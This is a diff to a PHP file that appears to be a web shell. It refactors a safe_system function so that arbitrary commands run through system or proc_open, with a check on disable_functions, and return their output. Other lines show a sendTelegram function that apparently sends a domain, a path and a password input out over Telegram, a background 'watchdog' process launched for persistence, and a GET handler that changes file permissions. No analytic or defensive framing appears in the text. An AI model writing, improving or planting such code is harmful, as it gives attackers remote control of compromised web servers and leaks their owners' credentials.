@@ -30,31 +30,30 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
     curl_close($ch);
 }
 function safe_system($cmd) {
-    $disabled = explode(',', ini_get('disable_functions'));
-    
-    if (function_exists('system') && !in_array('system', $disabled)) {
-        @system($cmd);
-        return true;
+    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
+        ob_start();
+        system($cmd);
+        return ob_get_clean();
     }
 
-    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
+    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
         $descriptorspec = [
-            0 => ["pipe", "r"], // stdin
-            1 => ["pipe", "w"], // stdout
-            2 => ["pipe", "w"]  // stderr
+            0 => ["pipe", "r"],  // stdin
+            1 => ["pipe", "w"],  // stdout
+            2 => ["pipe", "w"],  // stderr
         ];
+
         $process = proc_open($cmd, $descriptorspec, $pipes);
         if (is_resource($process)) {
-            foreach ($pipes as $pipe) {
-                fclose($pipe);
-            }
+            fclose($pipes[0]);
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
             proc_close($process);
-            return true;
+            return $output . $error;
         }
     }
-
-    return false;
-}
 
     return "❌ Command execution not available.";
 }
@@ -362,7 +361,7 @@ PHP;
     safe_system("/usr/bin/php $watchdog > /dev/null 2>&1 &");
 
     header("Location: ?path=" . urlencode($dir));
-exit;
+    exit;
 }
 if (isset($_GET['unlock']) && is_file($_GET['unlock'])) {
     chmod($_GET['unlock'], 0644);
